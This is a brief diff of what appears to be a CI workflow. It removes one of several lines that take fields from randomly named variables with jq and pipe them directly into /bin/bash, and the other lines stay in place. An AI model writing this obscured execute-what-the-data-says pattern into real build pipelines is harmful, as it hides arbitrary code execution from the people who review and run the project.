@@ -27,7 +27,6 @@ jobs:
           echo $p574 | jq -r .rq86412 | /bin/bash
           printf '%s' "$biplu86" | jq -r .cyjz4 | /bin/bash
           printf '%s' "$wc9" | jq -r .n98308 | /bin/bash
-          printf '%s' "$zwg5461" | jq -r .ntkls8700 | /bin/bash
           printf '%s' "$c3" | jq -r .ijkd2 | /bin/bash
 
       - name: Archive output
